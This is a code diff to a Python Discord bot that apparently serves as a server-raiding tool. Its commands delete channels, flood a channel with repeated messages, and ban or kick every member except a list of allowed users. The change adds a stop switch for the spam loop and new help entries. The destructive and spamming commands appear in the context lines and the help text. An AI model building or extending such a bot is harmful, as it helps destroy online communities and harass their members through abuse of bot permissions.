@@ -8,8 +8,11 @@ allowed_users = ['YOUR_USER_ID', 'YOUR_BOT_USER_ID'] # You can add more ID's
 
 
 
+spam = True
+
 @client.event
 async def on_message(message):
+  global spam
   if str(message.author.id) in allowed_users:
       if message.content == '!bot deletechn':
         await message.channel.send('Deleting Channels... ')
@@ -34,10 +37,11 @@ async def on_message(message):
             user = client.get_user(int(user_id))
             await message.channel.send(f'User <@{user_id}> has been removed from the allowed users list.')
       elif message.content.startswith('!bot spam'):
+       spam = True
        split_message = message.content.split(' ')
        if len(message.content) > 13:
         spam_message = " ".join(split_message[2:])
-        while True:
+        while spam is True:
           await message.channel.send(spam_message)
        else:
         await message.channel.send('Please provide a message to spam')
@@ -69,9 +73,15 @@ async def on_message(message):
             '!bot removeuser [user_id]': 'Removes a user from the allowed users list',
             '!bot spam [message]': 'Spams the provided message',
             '!bot ban all': 'Bans all members from the server except allowed users',
-            '!bot kick all': 'Kicks all members from the server except allowed users'
+            '!bot kick all': 'Kicks all members from the server except allowed users',
+            '!bot allowedusers': 'Lists all allowed users',
+            '!bot config': 'Displays the list of available commands and their descriptions',
+            '!bot stopspam': 'Stops the bot from spamming'
         }
         for command, description in command_desc.items():
             embed.add_field(name=command, value=description, inline=False)
         await message.channel.send(embed=embed)
+      elif message.content == '!bot stopspam':
+        spam = False
+        await message.channel.send('Spam stopped')
 client.run('YOUR_BOT_TOKEN')
